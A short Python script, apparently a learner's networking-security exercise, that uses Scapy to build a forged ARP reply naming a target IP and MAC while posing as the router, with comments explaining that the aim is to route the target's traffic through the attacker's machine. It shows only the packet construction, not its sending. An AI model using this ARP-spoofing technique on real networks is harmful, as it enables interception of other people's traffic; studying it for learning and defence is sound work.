#/usr/bin/env python
from scapy.layers.l2 import ARP

# Create an ARP **Response**, to redirect the flow of packets through our computer.
# We need fields:
# op value 2: Sets ARP Reply (target responds with MAC Address).
# "pdst", IP Address target computer.
# For me I ran "network_scanner" on "eth0" IP.
# Next target MAC, default gateway(??): hwdst = [TARGET_MAC_ADDRESS].
# Finally, set source packet - source my computer
# To tell target source is from the router.
# **route -n** returns the IP of the router (default gateway).
packet = ARP(op=2, pdst="192.168.1.123", hwdst="60:45:e8:31:e5:23", psrc="192.168.1.254" )